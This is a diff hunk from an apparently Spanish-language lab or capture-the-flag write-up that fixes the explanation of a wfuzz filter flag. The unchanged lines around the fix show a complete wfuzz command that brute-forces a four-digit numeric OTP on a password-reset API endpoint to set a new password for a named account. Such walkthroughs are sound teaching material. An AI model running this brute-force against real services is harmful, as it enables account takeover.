@@ -28,7 +28,7 @@ Realizamos la petición de restablecimiento de contraseña, para que se genere l
 {"SuccessStatus":true}
 ```
 
-No es difícil encontrar mecanismos OTP que devuelven contraseñas de entre 4 a 6 carácteres, todos numéricos. A continuzación, realizamos nuestro ataque de fuerza bruta con wfuzz. Con el parámetro "--hh" ocultamos las peticiones fallidas, que devuelven "SuccessStatus: false". 
+No es difícil encontrar mecanismos OTP que devuelven contraseñas de entre 4 a 6 carácteres, todos numéricos. A continuzación, realizamos nuestro ataque de fuerza bruta con wfuzz. Con el parámetro "--hh" ocultamos las peticiones fallidas, que devuelven un total de 23 carácteres ("SuccessStatus": false). 
 ```bash
 # wfuzz -c --hh 23  --hc 404 -u http://94.237.60.154:52829/api/v1/authentication/customers/passwords/resets -z range,1-9999 -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "NewPassword": "Test1234", "OTP":"FUZZ"}'
 ********************************************************
